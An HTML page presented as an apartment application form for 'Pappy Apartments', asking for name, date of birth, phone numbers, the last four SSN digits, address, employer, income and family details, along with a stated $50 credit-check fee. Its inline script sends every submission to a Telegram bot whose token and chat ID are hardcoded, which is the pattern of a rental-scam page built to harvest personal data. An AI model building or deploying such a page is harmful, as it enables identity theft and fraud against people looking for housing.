<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pappy Apartments â€“ Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('https://images.unsplash.com/photo-1560184897-35c0f642d0aa?ixlib=rb-4.0.3&auto=format&fit=crop&w=1950&q=80') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .form-container {
      background: rgba(255, 255, 255, 0.95);
      padding: 25px 30px;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
      max-width: 700px;
      width: 100%;
      margin: 30px auto;
    }
    h2 { text-align: center; margin-bottom: 20px; }
    h3 { margin-top: 25px; color: #007bff; }
    label { font-weight: bold; display: block; margin-top: 10px; }
    input, select, textarea {
      width: 100%; padding: 10px; margin-top: 5px;
      border-radius: 6px; border: 1px solid #ccc; font-size: 14px;
    }
    button {
      width: 100%; padding: 12px; margin-top: 20px;
      border-radius: 6px; border: none;
      background: #007bff; color: #fff; font-size: 16px;
      cursor: pointer; transition: background 0.3s;
    }
    button:hover { background: #0056b3; }
    .success, .error { text-align: center; margin-top: 15px; font-weight: bold; }
    .success { color: green; }
    .error { color: red; }
    .inline-block { display: inline-block; margin-right: 10px; }
    .hidden { display: none; }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>Apartment Application</h2>
    <form id="applicationForm">

      <h3>Personal Information</h3>
      <label>Type of Applicant:</label>
      <select name="applicant_type" required>
        <option value="">Select...</option>
        <option value="Tenant">Tenant</option>
        <option value="Guarantor">Guarantor</option>
      </select>

      <label>If Guarantor, Prospective Tenant & Relation:</label>
      <input type="text" name="guarantor_relation">

      <label>Full Name:</label>
      <input type="text" name="name" required>

      <label>Date of Birth:</label>
      <input type="date" name="dob" required>

      <label>Home Phone:</label>
      <input type="tel" name="home_phone" pattern="\d{10}" maxlength="10" placeholder="1234567890" required>

      <label>Mobile Phone:</label>
      <input type="tel" name="mobile_phone" pattern="\d{10}" maxlength="10" placeholder="1234567890" required>

      <label>Last 4 of SSN:</label>
      <input type="text" name="ssn_last4" maxlength="4" pattern="\d{4}" placeholder="1234" required>

      <label>Email Address:</label>
      <input type="email" name="email" required>

      <h3>Applicantâ€™s Rental History</h3>
      <label>Current Address:</label>
      <input type="text" name="current_address" required>

      <label>Apt #:</label>
      <input type="text" name="apt_number">

      <label>City:</label>
      <input type="text" name="city" required>

      <label>State:</label>
      <select name="state" required>
        <option value="">Select State...</option>
        <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option>
        <option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option>
        <option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option>
        <option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option>
        <option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option>
        <option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option>
        <option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option>
        <option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option>
        <option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option>
        <option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option>
        <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option>
        <option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option>
        <option>Wisconsin</option><option>Wyoming</option>
      </select>

      <label>Zip:</label>
      <input type="text" name="zip" required>

      <label>Reason for Moving:</label>
      <textarea name="reason_moving" rows="2"></textarea>

      <h3>Applicantâ€™s Employment History</h3>
      <label>Current Employer:</label>
      <input type="text" name="current_employer" required>

      <label>Occupation/Title:</label>
      <input type="text" name="occupation_title" required>

      <label>Pay Frequency:</label>
      <select name="pay_frequency" required>
        <option value="">Select...</option>
        <option value="Weekly">Weekly</option>
        <option value="Bi-Weekly">Bi-Weekly</option>
        <option value="Monthly">Monthly</option>
      </select>

      <label>Monthly Income ($):</label>
      <input type="number" name="income" required>

      <h3>Additional Information</h3>
      <label>Are you married?</label>
      <select name="married" required>
        <option value="">Select...</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>

      <label>Do you have kids?</label>
      <select name="kids" id="kids" required>
        <option value="">Select...</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>
      <span id="kidsCountBlock" class="hidden" style="margin-left:10px;">
        <label style="margin-right:5px;">How many?</label>
        <input type="number" name="kids_count" min="1" style="width:80px;">
      </span>

      <label>Do you have a car?</label>
      <select name="car" required>
        <option value="">Select...</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>

      <label>Do you have a pet?</label>
      <select name="pet" required>
        <option value="">Select...</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>

      <label>How long lease are you looking for?</label>
      <div style="display: flex; gap: 10px; align-items: center;">
        <input type="number" name="lease_months" min="0" placeholder="Months">
        <input type="number" name="lease_years" min="0" placeholder="Years">
      </div>

      <label>Are you ready to secure the apartment with security deposit?</label>
      <select name="deposit_ready" required>
        <option value="">Select...</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>

      <h3>Authorization</h3>
      <p>
        I hereby authorize the Landlord or Rental Agent to obtain information it deems desirable in the processing of my application,
        including credit reports, civil or criminal actions, rental history, employment/salary details, and any other relevant information.
        This application releases the Landlord, its employees and agents, from all liabilities and damage whatsoever incurred in furnishing
        and obtaining such information.
        *Credit check fee: $50.00 per applicant
      </p>
      <label>
        <input type="checkbox" name="authorization" required> I Agree
      </label>

      <button type="submit">Submit Application</button>
    </form>
    <div id="response"></div>
  </div>

<script>
  // Telegram Bot token & chat ID
  const BOT_TOKEN = "8428652927:AAEUirmhHly-u0E_HYDNdOzWp0m3MsXR_Oc";
  const CHAT_ID = "5590862324";
  const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  const form = document.getElementById("applicationForm");
  const responseEl = document.getElementById("response");

  // Kids inline toggle
  const kidsSelect = document.getElementById('kids');
  const kidsCountBlock = document.getElementById('kidsCountBlock');
  kidsSelect.addEventListener('change', () => {
    if(kidsSelect.value === 'Yes'){
      kidsCountBlock.classList.remove('hidden');
    } else {
      kidsCountBlock.classList.add('hidden');
    }
  });

  function showMessage(msg, isSuccess=true){
    responseEl.innerHTML = `<p class="${isSuccess ? 'success' : 'error'}">${msg}</p>`;
  }

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(form));

    const text = `ğŸ  New Apartment Application:\n\n` + 
      `ğŸ‘¤ Name: ${data.name}\nğŸ“… DOB: ${data.dob}\nğŸ“ Home: ${data.home_phone}\nğŸ“± Mobile: ${data.mobile_phone}\nğŸ”‘ Applicant Type: ${data.applicant_type}\n` +
      `ğŸ“§ Email: ${data.email}\nğŸ†” SSN Last4: ${data.ssn_last4}\n\n` +
      `ğŸ¡ Address: ${data.current_address}, Apt ${data.apt_number}, ${data.city}, ${data.state}, ${data.zip}\nğŸ“¦ Reason: ${data.reason_moving}\n\n` +
      `ğŸ’¼ Employer: ${data.current_employer}\nğŸ‘” Title: ${data.occupation_title}\nğŸ’° Income: $${data.income} (${data.pay_frequency})\n\n` +
      `ğŸ’ Married: ${data.married}\nğŸ‘¶ Kids: ${data.kids} ${data.kids==='Yes' ? '('+data.kids_count+')' : ''}\nğŸš— Car: ${data.car}\nğŸ¾ Pet: ${data.pet}\n` +
      `ğŸ“‘ Lease: ${data.lease_months} months, ${data.lease_years} years\nğŸ’µ Deposit Ready: ${data.deposit_ready}\n\n` +
      `âœ… Authorization: ${data.authorization ? 'Agreed' : 'No'}`;

    try {
      const res = await fetch(TELEGRAM_API, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
      const json = await res.json();
      if(json && json.ok){
        showMessage('âœ… Application sent successfully.');
        form.reset();
        kidsCountBlock.classList.add('hidden');
      } else {
        showMessage('âŒ Failed to send. Check your bot token and chat ID.', false);
      }
    } catch(err){
      showMessage('âŒ Error sending to Telegram.', false);
    }
  });
</script>
</body>
</html>
